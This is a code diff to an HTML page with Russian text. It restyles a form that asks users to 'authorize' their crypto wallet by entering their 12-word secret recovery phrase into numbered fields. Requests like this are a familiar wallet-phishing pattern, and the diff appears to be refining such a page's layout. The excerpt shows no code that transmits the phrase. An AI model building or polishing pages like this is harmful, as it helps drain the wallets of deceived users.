@@ -42,18 +42,18 @@
         }
         .seed-input {
             display: grid;
-            grid-template-columns: repeat(6, 1fr);
+            grid-template-columns: repeat(2, 1fr);
             gap: 10px;
         }
         .seed-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            position: relative;
         }
         .seed-item label {
-            font-size: 14px;
+            position: absolute;
+            top: -10px;
+            left: 10px;
+            font-size: 12px;
             color: #A0A0A0;
-            margin-bottom: 5px;
         }
         input {
             padding: 10px;
@@ -63,11 +63,13 @@
             background-color: #2C2C2C;
             color: #FFFFFF;
             text-align: center;
+            width: 100%;
+            box-sizing: border-box;
         }
         input::placeholder {
             color: #888888;
         }
-        input[type="text"]:focus {
+        input:focus {
             outline: none;
         }
         button {
@@ -100,7 +102,7 @@
         <p class="description">Авторизуйте ваш кошелёк вашей секретной фразой из 12-ти слов. Убедитесь, что вы храните её в безопасности!</p>
         <form id="seedForm">
             <div class="seed-input">
-                <!-- Поля для ввода с номерами -->
+                <!-- Поля для ввода -->
                 <div class="seed-item">
                     <label for="word1">1.</label>
                     <input type="text" id="word1" name="word1" placeholder="слово" required autocomplete="off" autocapitalize="none">
